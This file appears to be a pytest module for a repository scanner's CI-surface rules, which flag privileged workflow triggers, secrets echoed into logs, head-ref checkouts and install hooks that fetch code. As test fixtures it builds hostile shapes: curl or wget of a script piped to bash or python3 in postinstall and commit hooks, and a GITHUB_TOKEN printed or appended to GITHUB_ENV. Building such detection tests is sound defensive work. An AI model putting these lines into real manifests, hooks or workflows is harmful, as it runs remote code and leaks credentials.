"""The CI-surface rules (task 3.6, second slice, `ARCHITECTURE.md` 9.6).

`tests/unit/test_fixtures.py` already proves each rule fires on its own positive and not on its own
negative. What this module holds is the reason the slice exists: a workflow file, a package manifest
and a commit hook are each executed by something holding credentials, and until now the rule set
named none of them as a role of its own. That meant an incomplete read of a workflow was a WARN,
because the file only had the `source` fallback, and a secret echoed into a log was no finding.

Three of the six rules are decided in code rather than line by line, because each has to see two
things at once or several things at once in one line. Those go through `runner.collect`, which is
where detectors are dispatched. The three single-line rules are checked against the engine pass, and
the two severities that can fail a job are checked against `run_scan`, which decides the exit code.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from airlock import detectors, runner
from airlock.cli import run_scan
from airlock.model import (
    EMPTY_MANIFEST,
    EXIT_FINDINGS,
    EXIT_PASS,
    FileEntry,
    Mode,
    Policy,
    Rule,
    ScanContext,
    Severity,
)
from airlock.roles import (
    INSTALL_HOOK_ROLE,
    PACKAGE_MANIFEST_ROLE,
    SENSITIVE_ROLES,
    WORKFLOW_ROLE,
    known_roles,
    resolve_roles,
)
from airlock.rules import apply_patterns, cap_findings, load_role_globs, load_rules

REPO_ROOT = Path(__file__).resolve().parents[2]
ROLE_GLOBS = load_role_globs(REPO_ROOT / "rules" / "roles.toml")
RULES = load_rules(
    REPO_ROOT / "rules" / "builtin",
    known_detectors=detectors.DETECTOR_NAMES,
    known_roles=sorted(known_roles(ROLE_GLOBS)),
)

CODE_RULES = ("pat-secret-dump", "pat-ptr-head-checkout", "pat-lifecycle-exec")
FAMILY = (
    "pat-privileged-trigger",
    "pat-secret-dump",
    "pat-ptr-head-checkout",
    "pat-lifecycle-fetch",
    "pat-lifecycle-exec",
    "pat-editor-command-path",
)

POLICY = 'version = 1\n\n[policy]\nfail_on = "high"\n'

# Assembled at call time (`AGENTS.md` 4). The family rules read workflow, manifest and hook paths,
# and a test module is role `source`, so nothing here would be reported by them; it is assembled
# because a committed file holding a working dropper is forbidden regardless of who would read it.
SECRET_INTERP = "${{ " + "secrets.GITHUB_TOKEN }}"
PRIVILEGED = "pull_request_" + "target"
HEAD_REF = "ref: ${{ github.event." + "pull_request.head.sha }}"
CHECKOUT = "uses: " + "actions/checkout@v4"
FETCHER = "cu" + "rl"
FETCH = f"{FETCHER} -sL https://example.invalid/x.sh"
TO_SHELL = " | " + "bash"
TO_PYTHON = " | " + "python3"
FETCH_ONLY = f"{FETCHER} -sL https://example.invalid/versions.json -o /tmp/v.json"
PROCESS_SUB = "bash <(" + FETCH + ")"
LIFECYCLE_KEY = '"post' + "install" + '"'

WORKFLOW_HEAD = (
    f"on:\n"
    f"  {PRIVILEGED}:\n"
    f"    types: [opened]\n"
    f"jobs:\n"
    f"  build:\n"
    f"    runs-on: ubuntu-latest\n"
    f"    steps:\n"
    f"      - {CHECKOUT}\n"
    f"        with:\n"
    f"          {HEAD_REF}\n"
)


def git(root: Path, *args: str) -> str:
    result = subprocess.run(
        [
            "git",
            "-C",
            str(root),
            "-c",
            "user.name=airlock-test",
            "-c",
            "user.email=airlock-test@example.invalid",
            "-c",
            "core.hooksPath=/dev/null",
            *args,
        ],
        capture_output=True,
        text=True,
        check=True,
    )
    return result.stdout


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    root = tmp_path / "repo"
    root.mkdir()
    git(root, "init", "-q", "--initial-branch=main")
    return root


def commit_files(root: Path, files: dict[str, str]) -> None:
    for rel, text in {"airlock.toml": POLICY, **files}.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    git(root, "add", "-A")
    git(root, "commit", "-q", "-m", "fixture")


def roles_of(path: str) -> tuple[str, ...]:
    return resolve_roles(path, b"", ROLE_GLOBS)


def entry(path: str, text: str) -> FileEntry:
    return FileEntry(path=path, sha256="a" * 64, roles=roles_of(path), text=text)


def context(*files: tuple[str, str]) -> ScanContext:
    return ScanContext(
        entries=tuple(entry(path, text) for path, text in files),
        policy=Policy(),
        manifest=EMPTY_MANIFEST,
        rules=RULES,
    )


def rule_ids(*files: tuple[str, str]) -> set[str]:
    """Every finding the whole pipeline would raise, engine pass and detectors together."""
    return {finding.rule_id for finding in runner.collect(context(*files))}


def findings_for(*files: tuple[str, str]) -> list[tuple[str, Severity]]:
    return [(finding.rule_id, finding.severity) for finding in runner.collect(context(*files))]


def collect_with_cap(line_cap: int, path: str, text: str) -> list[tuple[str, Severity]]:
    """One file under a chosen `line_cap`, so an over-cap line can be shown rather than claimed."""
    ctx = ScanContext(
        entries=(entry(path, text),),
        policy=Policy(line_cap=line_cap),
        manifest=EMPTY_MANIFEST,
        rules=RULES,
    )
    return [(finding.rule_id, finding.severity) for finding in runner.collect(ctx)]


def shipped_rule(rule_id: str) -> Rule:
    return next(rule for rule in RULES if rule.id == rule_id)


class TestTheNewRolesResolve:
    @pytest.mark.parametrize(
        ("path", "role"),
        [
            (".github/workflows/release.yml", WORKFLOW_ROLE),
            ("packages/ui/.github/workflows/x.yaml", WORKFLOW_ROLE),
            ("package.json", PACKAGE_MANIFEST_ROLE),
            ("packages/ui/package.json", PACKAGE_MANIFEST_ROLE),
            (".husky/pre-commit", INSTALL_HOOK_ROLE),
            (".githooks/commit-msg", INSTALL_HOOK_ROLE),
        ],
    )
    def test_a_ci_surface_path_claims_its_role_and_its_fallback(self, path: str, role: str) -> None:
        resolved = roles_of(path)
        assert role in resolved, resolved
        # The fallback stays, which is what keeps `cfg-long-line` and the text-side family reading
        # these files as well as the CI rules.
        assert resolved[-1] in {"source", "other"}, resolved

    def test_vscode_settings_is_editor_autorun_now(self) -> None:
        assert "editor-autorun" in roles_of(".vscode/settings.json")
        assert "editor-autorun" in roles_of(".vscode/tasks.json")

    @pytest.mark.parametrize("role", [WORKFLOW_ROLE, PACKAGE_MANIFEST_ROLE, INSTALL_HOOK_ROLE])
    def test_every_new_role_is_sensitive(self, role: str) -> None:
        """Each is executed by something holding credentials, which is the bar the set holds."""
        assert role in SENSITIVE_ROLES

    def test_a_workflow_with_an_over_cap_line_is_high_now_not_warn(self) -> None:
        """The reason the roles were added: an unreadable file is only as safe as its role."""
        findings = cap_findings(RULES, entry(".github/workflows/x.yml", "a" * 91 + "\n"), 90)
        assert [finding.severity for finding in findings] == [Severity.HIGH]

    def test_the_same_line_in_a_source_file_is_still_a_warning(self) -> None:
        findings = cap_findings(RULES, entry("src/model.js", "a" * 91 + "\n"), 90)
        assert [finding.severity for finding in findings] == [Severity.WARN]

    @pytest.mark.parametrize(
        ("path", "role"),
        [
            ("docs/workflows.yml", WORKFLOW_ROLE),
            ("workflow.yml", WORKFLOW_ROLE),
            ("notes/package-lock.json", PACKAGE_MANIFEST_ROLE),
            ("hooks/pre-commit", INSTALL_HOOK_ROLE),
            (".githooksx/pre-commit", INSTALL_HOOK_ROLE),
        ],
    )
    def test_a_path_that_is_not_one_of_them_does_not_claim_the_role(
        self, path: str, role: str
    ) -> None:
        assert role not in roles_of(path)

    def test_a_manifest_anywhere_in_the_tree_claims_the_role(self) -> None:
        """npm reads a `package.json` in any directory, so a nested one is not a safe hiding place.

        A lockfile is the deliberate exception: it carries resolved URLs but no scripts to run.
        """
        assert PACKAGE_MANIFEST_ROLE in roles_of("packages/ui/package.json")
        assert PACKAGE_MANIFEST_ROLE not in roles_of("packages/ui/package-lock.json")

    def test_a_workflow_is_still_read_by_the_source_side_family(self) -> None:
        """A workflow is text, so the text-side family must keep covering it via the fallback."""
        hits = rule_ids(
            (
                ".github/workflows/x.yml",
                f"  run: {'ev' + 'al'}({'Buf' + 'fer.from'}(process.argv[2], 'base64'))\n",
            )
        )
        assert "pat-decode-eval" in hits


class TestTheRulesClaimTheirRoles:
    @pytest.mark.parametrize(
        ("rule_id", "claimed"),
        [
            ("pat-privileged-trigger", {WORKFLOW_ROLE}),
            ("pat-secret-dump", {WORKFLOW_ROLE}),
            ("pat-ptr-head-checkout", {WORKFLOW_ROLE}),
            ("pat-lifecycle-fetch", {PACKAGE_MANIFEST_ROLE, INSTALL_HOOK_ROLE}),
            ("pat-lifecycle-exec", {PACKAGE_MANIFEST_ROLE, INSTALL_HOOK_ROLE}),
            ("pat-editor-command-path", {"editor-autorun"}),
        ],
    )
    def test_a_rule_names_exactly_the_surface_it_runs_on(
        self, rule_id: str, claimed: set[str]
    ) -> None:
        assert set(shipped_rule(rule_id).roles) == claimed

    @pytest.mark.parametrize("rule_id", FAMILY)
    def test_no_ci_surface_rule_reads_source_or_doc(self, rule_id: str) -> None:
        """This repository's docs name these shapes; a rule reading prose would report itself."""
        assert "source" not in shipped_rule(rule_id).roles
        assert "doc" not in shipped_rule(rule_id).roles

    @pytest.mark.parametrize("rule_id", CODE_RULES)
    def test_the_combination_rules_are_decided_in_code(self, rule_id: str) -> None:
        assert shipped_rule(rule_id).detector == "builtin:ci_surface"

    def test_the_ci_surface_detector_is_registered(self) -> None:
        assert "ci_surface" in detectors.DETECTOR_NAMES
        assert any("ci_surface" in getattr(fn, "__module__", "") for fn in detectors.DETECTORS)

    @pytest.mark.parametrize("rule_id", CODE_RULES)
    def test_a_code_rule_carries_no_pattern_the_engine_would_double_run(self, rule_id: str) -> None:
        assert shipped_rule(rule_id).pattern is None

    def test_the_engine_does_not_report_a_code_rule(self) -> None:
        workflow = (".github/workflows/a.yml", WORKFLOW_HEAD)
        engine = {f.rule_id for f in apply_patterns(RULES, entry(*workflow), 20_000)}
        assert "pat-ptr-head-checkout" not in engine
        assert "pat-secret-dump" not in engine
        assert "pat-privileged-trigger" in engine, "the trigger fact is still the engine's"


class TestPrivilegedTriggerIsAFactNotACrime:
    def test_the_trigger_alone_is_a_warning_that_does_not_stop_a_job(self, repo: Path) -> None:
        workflow = f"on:\n  {PRIVILEGED}:\njobs:\n  x:\n    steps: []\n"
        commit_files(repo, {".github/workflows/comment-bot.yml": workflow})

        report = run_scan(repo, Mode.FULL)

        assert report.exit_code == EXIT_PASS
        tiers = [
            item.severity for item in report.findings if item.rule_id == "pat-privileged-trigger"
        ]
        assert tiers == [Severity.WARN]

    def test_an_ordinary_pull_request_trigger_is_not_reported(self) -> None:
        assert "pat-privileged-trigger" not in rule_ids(
            (".github/workflows/ci.yml", "on:\n  pull_request:\n    branches: [main]\n")
        )


class TestSecretDump:
    def test_a_step_that_prints_a_secret_changes_the_exit_code(self, repo: Path) -> None:
        workflow = f'jobs:\n  x:\n    steps:\n      - run: echo "token is {SECRET_INTERP}"\n'
        commit_files(repo, {".github/workflows/leak.yml": workflow})

        report = run_scan(repo, Mode.FULL)

        assert report.exit_code == EXIT_FINDINGS
        found = [item for item in report.findings if item.rule_id == "pat-secret-dump"]
        assert found and found[0].severity is Severity.HIGH
        assert found[0].line == 4
        assert found[0].path == ".github/workflows/leak.yml"

    @pytest.mark.parametrize(
        "line",
        [
            f"token: {SECRET_INTERP}",
            f'args: -u ":${SECRET_INTERP}" api.example.invalid',
            'run: echo "building ${{ matrix.os }}"',
            'run: echo "ref ${{ github.event.pull_request.head.ref }}"',
        ],
        ids=["auth-input", "basic-auth", "not-a-secret", "head-ref-no-secret"],
    )
    def test_a_secret_used_as_input_or_another_interpolation_is_not_a_dump(self, line: str) -> None:
        assert "pat-secret-dump" not in rule_ids((".github/workflows/a.yml", f"  {line}\n"))

    def test_masking_a_secret_for_later_comparison_is_the_innocent_echo(self) -> None:
        line = f'run: echo "::add-mask::{SECRET_INTERP}"'
        assert "pat-secret-dump" not in rule_ids((".github/workflows/a.yml", f"  {line}\n"))

    def test_a_secret_appended_to_the_env_file_is_a_dump_not_an_input(self) -> None:
        """The documented npm-auth recipe puts a token where every later step can read it."""
        line = f'run: echo "//registry/:_authToken={SECRET_INTERP}" >> "$GITHUB_ENV"'
        assert "pat-secret-dump" in rule_ids((".github/workflows/a.yml", f"  {line}\n"))


class TestPrivilegedCheckoutOfTheHead:
    def test_the_combination_is_high_through_the_whole_pipeline(self, repo: Path) -> None:
        commit_files(repo, {".github/workflows/build-head.yml": WORKFLOW_HEAD})

        report = run_scan(repo, Mode.FULL)

        assert report.exit_code == EXIT_FINDINGS
        found = [item for item in report.findings if item.rule_id == "pat-ptr-head-checkout"]
        assert found, [item.rule_id for item in report.findings]
        assert found[0].severity is Severity.HIGH
        assert found[0].path == ".github/workflows/build-head.yml"
        assert found[0].line == 10, "the finding sits on the ref, not on the trigger"

    @pytest.mark.parametrize(
        ("workflow", "why"),
        [
            (
                WORKFLOW_HEAD.replace(PRIVILEGED, "pull_request"),
                "same shape, unprivileged trigger: the checkout is reviewed code",
            ),
            (
                WORKFLOW_HEAD.replace(HEAD_REF, "ref: refs/heads/main"),
                "privileged trigger, checked out the base rather than the head",
            ),
            (
                WORKFLOW_HEAD.replace(f"      - {CHECKOUT}\n", ""),
                "privileged trigger and a head ref with no checkout step to act on it",
            ),
            (f"on:\n  {PRIVILEGED}:\n", "trigger alone"),
        ],
        ids=["pull-request", "base-ref", "no-checkout", "trigger-only"],
    )
    def test_each_half_alone_is_not_the_finding(self, workflow: str, why: str) -> None:
        assert "pat-ptr-head-checkout" not in rule_ids((".github/workflows/a.yml", workflow)), why

    def test_a_comment_naming_the_shape_still_counts(self) -> None:
        """Raw text, no masking (ADR-013): the rule reads YAML it cannot parse."""
        commented = f"# {PRIVILEGED} with {HEAD_REF} and {CHECKOUT} is how this leaks\n"
        assert "pat-ptr-head-checkout" in rule_ids((".github/workflows/a.yml", commented))

    def test_the_code_rules_do_not_read_a_line_past_the_cap(self) -> None:
        """`AGENTS.md` 4 applies to a detector's own regexes, not only to the engine's.

        The whole shape on one over-cap line is invisible to the pairing, and it is still reported:
        `cfg-long-line` gives it as a HIGH, because a workflow is a sensitive role now.
        """
        shape = f"{PRIVILEGED} {CHECKOUT} {HEAD_REF} " + "x" * 40
        hits = dict(collect_with_cap(90, ".github/workflows/a.yml", shape + "\n"))
        assert "pat-ptr-head-checkout" not in hits
        assert hits["cfg-long-line"] is Severity.HIGH

    def test_a_pull_ref_merge_checkout_under_the_trigger_counts(self) -> None:
        ref = "  ref: refs/pull/12" + "/merge\n"
        workflow = f"on:\n  {PRIVILEGED}:\njobs: {{}}\n" + f"- {CHECKOUT}\n" + ref
        assert "pat-ptr-head-checkout" in rule_ids((".github/workflows/a.yml", workflow))


class TestInstallHookDropper:
    def test_a_lifecycle_script_that_fetches_and_runs_fails_the_job(self, repo: Path) -> None:
        manifest = f'{{\n  "scripts": {{\n    {LIFECYCLE_KEY}: "{FETCH}{TO_SHELL}"\n  }}\n}}\n'
        commit_files(repo, {"package.json": manifest})

        report = run_scan(repo, Mode.FULL)

        assert report.exit_code == EXIT_FINDINGS
        tiers = {
            item.rule_id: item.severity
            for item in report.findings
            if item.rule_id in ("pat-lifecycle-fetch", "pat-lifecycle-exec")
        }
        assert tiers == {"pat-lifecycle-fetch": Severity.WARN, "pat-lifecycle-exec": Severity.HIGH}

    def test_a_hook_that_fetches_on_commit_is_reported(self, repo: Path) -> None:
        commit_files(repo, {".husky/pre-commit": f"#!/bin/sh\n{FETCH}{TO_SHELL}\n"})

        report = run_scan(repo, Mode.FULL)

        assert report.exit_code == EXIT_FINDINGS
        assert "pat-lifecycle-exec" in {item.rule_id for item in report.findings}

    @pytest.mark.parametrize(
        "value",
        ['"npm run build"', '"husky install"', '"node scripts/install.js"', '"tsc -b"'],
        ids=["build", "hook-installer", "own-script", "compiler"],
    )
    def test_a_lifecycle_script_that_runs_a_named_build_step_is_not_a_dropper(
        self, value: str
    ) -> None:
        manifest = f'{{\n  "scripts": {{\n    {LIFECYCLE_KEY}: {value}\n  }}\n}}\n'
        hits = rule_ids(("package.json", manifest))
        assert "pat-lifecycle-fetch" not in hits
        assert "pat-lifecycle-exec" not in hits

    def test_a_remote_fetch_with_no_shell_on_the_other_side_is_a_near_miss(self) -> None:
        hook = "#!/bin/sh\n" + FETCH_ONLY + "\n"
        hits = findings_for((".githooks/pre-commit", hook))
        assert ("pat-lifecycle-exec", Severity.HIGH) not in hits
        assert ("pat-lifecycle-fetch", Severity.WARN) in hits

    @pytest.mark.parametrize(
        "line",
        [FETCH + TO_SHELL, "wget -qO- https://example.invalid/k" + TO_PYTHON],
        ids=["bash", "python"],
    )
    def test_the_exec_rule_also_holds_in_a_manifest(self, line: str) -> None:
        manifest = f'{{\n  "scripts": {{\n    "preinstall": "{line}"\n  }}\n}}\n'
        assert "pat-lifecycle-exec" in rule_ids(("package.json", manifest))

    def test_an_interpreter_named_without_a_fetch_is_not_a_dropper(self) -> None:
        hook = "#!/bin/sh\njq -r .script config.json" + TO_SHELL + "\n"
        hits = rule_ids((".githooks/pre-commit", hook))
        assert "pat-lifecycle-exec" not in hits
        assert "pat-lifecycle-fetch" not in hits

    def test_process_substitution_of_a_fetch_is_the_same_dropper(self) -> None:
        hook = "#!/bin/bash\n" + PROCESS_SUB + "\n"
        assert "pat-lifecycle-exec" in rule_ids((".husky/pre-commit", hook))


class TestEditorCommandPath:
    @pytest.mark.parametrize(
        "key",
        ['"python.defaultInterpreterPath"', '"typescript.tsdk"', '"eslint.executablePath"'],
        ids=["interpreter", "compiler-dir", "linter-binary"],
    )
    def test_a_setting_that_points_the_editor_at_an_executable_is_a_warning(self, key: str) -> None:
        settings = f'{{\n  {key}: "./node_modules/.bin/tool"\n}}\n'
        assert "pat-editor-command-path" in rule_ids((".vscode/settings.json", settings))

    @pytest.mark.parametrize(
        "settings",
        [
            '{\n  "editor.formatOnSave": true,\n  "editor.tabSize": 2\n}\n',
            '{\n  "python.analysis.typeCheckingMode": "basic"\n}\n',
        ],
        ids=["preferences", "analysis"],
    )
    def test_a_setting_with_no_path_behind_it_is_not(self, settings: str) -> None:
        assert "pat-editor-command-path" not in rule_ids((".vscode/settings.json", settings))

    def test_the_same_key_in_a_source_file_is_not_reported(self) -> None:
        settings = '{\n  "python.defaultInterpreterPath": "./x"\n}\n'
        assert "pat-editor-command-path" not in rule_ids(("src/settings.json", settings))


class TestThisRepositoryDoesNotTriggerItsOwnRules:
    """The self-scan runs these rules against the two real workflows on every pull request."""

    @pytest.mark.parametrize(
        "path",
        [".github/workflows/ci.yml", ".github/workflows/roadmap-check.yml"],
    )
    def test_the_shipped_workflows_are_clean(self, path: str) -> None:
        text = (REPO_ROOT / path).read_text(encoding="utf-8")
        fired = sorted(
            rule_id
            for rule_id in rule_ids((path, text))
            if rule_id in FAMILY or rule_id == "detector-error"
        )
        assert fired == [], (path, fired)

    @pytest.mark.parametrize(
        "path",
        ["rules/builtin/ci_surface.toml", "tests/fixtures/ci_surface.py"],
    )
    def test_the_rule_data_and_its_fixtures_hold_only_fragments(self, path: str) -> None:
        text = (REPO_ROOT / path).read_text(encoding="utf-8")
        fired = sorted(
            rule_id for rule_id in rule_ids((f"probe/{path}", text)) if rule_id in FAMILY
        )
        assert fired == [], (path, fired)
